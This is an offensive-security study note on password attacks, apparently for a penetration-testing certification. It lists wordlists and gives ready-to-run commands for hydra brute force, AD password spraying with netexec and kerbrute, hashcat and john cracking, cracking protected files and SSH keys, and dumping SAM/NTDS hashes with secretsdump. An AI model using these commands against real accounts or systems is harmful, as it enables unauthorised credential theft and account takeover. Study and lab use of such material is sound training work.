# 07 — Password Attacks

## Golden Rule: Spray, Don't Brute
One password against many users beats many passwords against one user — avoids account lockouts in AD. Always check lockout policy first if possible.

## Wordlists
```bash
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```
Custom wordlist from a target's website content (great for CMS admin panels):
```bash
cewl http://target -m 5 -w custom_wordlist.txt
```

## Online Brute Force / Spraying

```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Better for AD password spraying (locks-out aware, uses SMB/LDAP/Kerberos)
nxc smb <IP> -u users.txt -p 'Summer2024!' --continue-on-success
kerbrute passwordspray -d target.local --dc <IP> users.txt 'Summer2024!'
```
**Better than HTB's hydra-for-everything approach:** for AD specifically, `kerbrute` (Kerberos pre-auth, no lockout-triggering the same way as SMB, and fast) and `netexec`/`nxc` for SMB spraying are the professional standard — hydra is clunky for AD.

## Hash Cracking

```bash
# Identify hash type
hashid <hash>
hash-identifier

# John
john --wordlist=rockyou.txt hashes.txt
john --format=nt hashes.txt --wordlist=rockyou.txt
john --show hashes.txt

# Hashcat (GPU — much faster than john if you have a GPU)
hashcat -m 1000 hashes.txt rockyou.txt          # NTLM
hashcat -m 18200 hashes.txt rockyou.txt         # AS-REP hash
hashcat -m 13100 hashes.txt rockyou.txt         # Kerberoast (TGS)
hashcat -m 5600 hashes.txt rockyou.txt          # NetNTLMv2
hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a         # brute-force mask attack
```
**Common hashcat modes to memorize for CPTS:**
| Mode | Type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast |
| 18200 | AS-REP Roast |
| 1800 | sha512crypt (linux shadow) |

## Cracking Zip/Office/PDF/SSH Keys

```bash
zip2john file.zip > zip.hash && john zip.hash
office2john file.docx > office.hash && john office.hash
pdf2john file.pdf > pdf.hash && john pdf.hash
ssh2john id_rsa > ssh.hash && john ssh.hash
```

## /etc/shadow + /etc/passwd combo

```bash
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=rockyou.txt
```

## Cracking Windows SAM/NTDS

```bash
# from SAM+SYSTEM hives
secretsdump.py -sam SAM -system SYSTEM LOCAL

# from NTDS.dit dump (domain controller)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| AD password spraying | hydra | `netexec (nxc)` + `kerbrute` |
| Hash cracking | john only | `hashcat` if GPU available (10-100x faster) |
| Wordlist generation | manual | `cewl` for site-specific words |

Next: `08-shells-payloads.md`
